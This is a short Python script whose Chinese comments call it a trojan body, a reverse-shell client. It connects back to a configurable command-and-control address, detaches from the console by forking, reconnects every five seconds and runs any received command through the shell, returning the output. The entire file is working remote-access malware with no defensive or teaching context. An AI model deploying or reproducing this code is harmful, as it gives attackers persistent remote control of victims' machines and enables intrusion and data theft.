#!/usr/bin/env python3
# ============================================================
#  木马本体 - 反弹 shell 客户端
#  启动后反向连接 C2,等待命令并把执行结果回传。
#  默认 5s 重连,断线不断尝试。
# ============================================================
import socket
import subprocess
import sys
import time
import os

# ---------- 配置 ----------
HOST = "127.0.0.1"     # 改成 C2 真实 IP
PORT = 4444
RETRY_DELAY = 5        # 断线后重连间隔(秒)
# -----------------------

def run_cmd(cmd: str) -> str:
    """用 shell 模式跑命令,兼容管道/重定向。"""
    try:
        out = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
        )
        return out.stdout.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[!] command timeout\n"
    except Exception as e:
        return f"[!] {e}\n"

def main() -> None:
    # 让进程脱离控制台,即使父进程退出也能继续
    if os.fork() != 0:
        sys.exit(0)
    os.setsid()

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((HOST, PORT))
            sock.sendall(b"[+] client online\n")

            while True:
                data = sock.recv(4096)
                if not data:
                    break
                cmd = data.decode(errors="replace").strip()
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    sock.close()
                    return
                sock.sendall(run_cmd(cmd).encode())

        except Exception:
            time.sleep(RETRY_DELAY)
        finally:
            try:
                sock.close()
            except Exception:
                pass

if __name__ == "__main__":
    main()
